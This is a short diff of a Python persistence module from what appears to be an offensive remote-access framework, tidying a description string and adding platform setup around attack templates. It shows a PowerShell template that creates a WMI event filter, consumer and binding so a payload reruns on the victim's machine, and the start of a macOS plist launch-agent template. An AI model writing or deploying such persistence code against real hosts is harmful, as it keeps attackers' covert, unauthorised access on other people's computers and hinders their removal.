@@ -20,7 +20,18 @@ packages = ['_winreg'] if sys.platform == 'win32' else []
 platforms = ['win32','linux2','darwin']
 results = {}
 usage = 'persistence [method] <add/remove>'
-description = 'Establish persistence on the client host machine with multiple methods to ensure redundancy'
+description = """
+Establish persistence on the client host machine 
+with multiple methods to ensure redundancy
+"""
+
+# setup
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
+
+# templates
 __Template_wmi = """$filter = ([wmiclass]"\\\\.\\root\\subscription:__EventFilter").CreateInstance()
 $filter.QueryLanguage = "WQL"
 $filter.Query = "Select * from __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA [STARTUP]"
@@ -40,6 +51,7 @@ $bind.Filter = $filterPath
 $bind.Consumer = $consumerPath
 $result = $bind.Put()
 $bindPath = $result.Path"""
+
 __Template_plist = """#!/bin/bash
 echo '<plist version="1.0">
 <dict>
